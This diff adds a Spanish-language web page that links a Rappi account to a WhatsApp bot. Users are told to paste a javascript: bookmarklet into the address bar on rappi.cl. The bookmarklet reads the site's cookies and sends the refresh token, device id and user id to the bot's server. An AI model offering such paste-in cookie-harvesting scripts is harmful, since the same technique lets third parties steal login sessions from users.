@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
+  <title>Conectar Rappi</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      background: #f5f5f5;
+      min-height: 100vh;
+      display: flex;
+      align-items: flex-start;
+      justify-content: center;
+      padding: 24px 16px;
+    }
+    .card {
+      background: white;
+      border-radius: 16px;
+      padding: 28px 24px;
+      width: 100%;
+      max-width: 420px;
+      box-shadow: 0 2px 16px rgba(0,0,0,0.08);
+    }
+    .logo { font-size: 2rem; margin-bottom: 8px; }
+    h1 { font-size: 1.4rem; font-weight: 700; color: #1a1a1a; margin-bottom: 6px; }
+    .subtitle { font-size: 0.95rem; color: #666; margin-bottom: 28px; line-height: 1.4; }
+
+    .step {
+      display: flex;
+      gap: 14px;
+      margin-bottom: 22px;
+      align-items: flex-start;
+    }
+    .step-num {
+      width: 28px; height: 28px;
+      border-radius: 50%;
+      background: #ff441b;
+      color: white;
+      font-size: 0.85rem;
+      font-weight: 700;
+      display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0;
+    }
+    .step-body { flex: 1; }
+    .step-title { font-weight: 600; font-size: 0.95rem; color: #1a1a1a; margin-bottom: 4px; }
+    .step-desc { font-size: 0.85rem; color: #555; line-height: 1.45; }
+
+    input[type="tel"] {
+      width: 100%;
+      padding: 14px 16px;
+      border: 1.5px solid #ddd;
+      border-radius: 10px;
+      font-size: 1rem;
+      outline: none;
+      transition: border-color 0.2s;
+      margin-top: 8px;
+    }
+    input[type="tel"]:focus { border-color: #ff441b; }
+
+    .btn {
+      display: block;
+      width: 100%;
+      padding: 14px;
+      border-radius: 10px;
+      border: none;
+      font-size: 1rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: opacity 0.15s;
+      margin-top: 10px;
+    }
+    .btn:active { opacity: 0.75; }
+    .btn-primary { background: #ff441b; color: white; }
+    .btn-secondary {
+      background: #f0f0f0;
+      color: #333;
+      font-size: 0.9rem;
+    }
+
+    .code-box {
+      background: #1a1a1a;
+      color: #4ade80;
+      border-radius: 10px;
+      padding: 14px;
+      font-family: monospace;
+      font-size: 0.78rem;
+      line-height: 1.5;
+      overflow-x: auto;
+      margin-top: 8px;
+      word-break: break-all;
+    }
+    .copy-btn {
+      background: #333;
+      color: #ddd;
+      border: none;
+      border-radius: 6px;
+      padding: 6px 12px;
+      font-size: 0.8rem;
+      cursor: pointer;
+      margin-top: 6px;
+      width: 100%;
+    }
+    .copy-btn:active { background: #555; }
+
+    .status {
+      margin-top: 18px;
+      padding: 14px;
+      border-radius: 10px;
+      font-size: 0.9rem;
+      font-weight: 500;
+      text-align: center;
+      display: none;
+    }
+    .status.success { background: #d1fae5; color: #065f46; display: block; }
+    .status.error { background: #fee2e2; color: #991b1b; display: block; }
+    .status.loading { background: #e0f2fe; color: #0c4a6e; display: block; }
+
+    .divider { border: none; border-top: 1px solid #eee; margin: 24px 0; }
+    #step2, #step3 { display: none; }
+    #step2.visible, #step3.visible { display: block; }
+  </style>
+</head>
+<body>
+<div class="card">
+  <div class="logo">🛒</div>
+  <h1>Conectar tu cuenta Rappi</h1>
+  <p class="subtitle">Vincula tu cuenta Rappi al bot de WhatsApp. Solo necesitas hacerlo una vez.</p>
+
+  <!-- Step 1: Phone number -->
+  <div class="step">
+    <div class="step-num">1</div>
+    <div class="step-body">
+      <div class="step-title">Ingresa tu número de WhatsApp</div>
+      <div class="step-desc">El mismo número desde el que le escribes al bot.</div>
+      <input type="tel" id="phone" placeholder="+56912345678" />
+      <button class="btn btn-primary" onclick="goStep2()">Continuar →</button>
+    </div>
+  </div>
+
+  <!-- Step 2: Open Rappi and get script -->
+  <div id="step2">
+    <hr class="divider" />
+    <div class="step">
+      <div class="step-num">2</div>
+      <div class="step-body">
+        <div class="step-title">Inicia sesión en Rappi</div>
+        <div class="step-desc">Abre rappi.cl en el mismo navegador y asegúrate de estar conectado.</div>
+        <a href="https://www.rappi.cl" target="_blank">
+          <button class="btn btn-secondary" style="margin-top:10px">Abrir rappi.cl ↗</button>
+        </a>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-num">3</div>
+      <div class="step-body">
+        <div class="step-title">Ejecuta el script de extracción</div>
+        <div class="step-desc">
+          En la pestaña de Rappi, copia el siguiente código, pégalo en la barra de direcciones
+          del navegador (reemplaza la URL actual), y presiona Enter.<br /><br />
+          <strong>En iOS Safari:</strong> primero guarda cualquier página como favorito,
+          luego edita ese favorito y pega el código como la URL.
+        </div>
+        <div class="code-box" id="script-box">Cargando...</div>
+        <button class="copy-btn" onclick="copyScript()">📋 Copiar script</button>
+      </div>
+    </div>
+
+    <div id="step3">
+      <hr class="divider" />
+      <div class="step">
+        <div class="step-num">4</div>
+        <div class="step-body">
+          <div class="step-title">Confirma el registro</div>
+          <div class="step-desc">El script enviará tus tokens automáticamente. Si todo fue bien, verás una confirmación aquí.</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="status" id="status"></div>
+</div>
+
+<script>
+  // The server URL — injected at serve time or detected from the current page
+  const SERVER = window.location.origin;
+  let userPhone = "";
+
+  function showStatus(msg, type) {
+    const el = document.getElementById("status");
+    el.textContent = msg;
+    el.className = "status " + type;
+  }
+
+  function goStep2() {
+    const phone = document.getElementById("phone").value.trim();
+    if (!phone.match(/^\+?[\d\s\-]{8,20}$/)) {
+      showStatus("Ingresa un número de teléfono válido (ej: +56912345678)", "error");
+      return;
+    }
+    userPhone = phone.startsWith("+") ? phone : "+" + phone;
+    document.getElementById("step2").classList.add("visible");
+    document.getElementById("step3").classList.add("visible");
+    buildScript(userPhone);
+    showStatus("", "");
+    document.getElementById("phone").scrollIntoView({ behavior: "smooth" });
+  }
+
+  function buildScript(phone) {
+    // This JS snippet runs inside rappi.cl (same origin) so it can read cookies
+    const snippet = `javascript:(function(){
+  var c=document.cookie;
+  var uid,did,rt;
+  try{uid=JSON.parse(atob(c.match(/rappi\\.data=([^;]+)/)[1])).id;}catch(e){}
+  try{did=c.match(/deviceid=([^;]+)/)[1];}catch(e){}
+  try{var r=c.match(/rappi_refresh_token=([^;]+)/)[1];rt=r.startsWith('ft.')?r:atob(r);}catch(e){}
+  if(!rt||!uid){alert('No se encontraron tokens. Aseg\\u00FArate de estar conectado en Rappi.');return;}
+  fetch('${SERVER}/auth/register',{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({phone:'${phone}',refresh_token:rt,device_id:did||'',user_id:uid})
+  }).then(r=>r.json()).then(d=>{
+    if(d.status==='ok'){alert('\\u2705 Listo! Ya puedes usar el bot de WhatsApp.');}
+    else{alert('Error: '+JSON.stringify(d));}
+  }).catch(e=>alert('Error de red: '+e));
+})();`;
+    document.getElementById("script-box").textContent = snippet;
+  }
+
+  function copyScript() {
+    const text = document.getElementById("script-box").textContent;
+    navigator.clipboard.writeText(text).then(() => {
+      showStatus("✅ Script copiado. Pégalo en la barra de direcciones de rappi.cl", "success");
+    }).catch(() => {
+      // Fallback for older mobile browsers
+      const el = document.getElementById("script-box");
+      const range = document.createRange();
+      range.selectNodeContents(el);
+      const sel = window.getSelection();
+      sel.removeAllRanges();
+      sel.addRange(range);
+      showStatus("Selecciona todo el texto de arriba y cópialo manualmente", "loading");
+    });
+  }
+
+  // Listen for registration success posted from the rappi.cl tab (postMessage)
+  window.addEventListener("message", (event) => {
+    if (event.data && event.data.rappibot === "registered") {
+      showStatus("✅ ¡Cuenta vinculada! Ya puedes usar el bot en WhatsApp.", "success");
+    }
+  });
+</script>
+</body>
+</html>
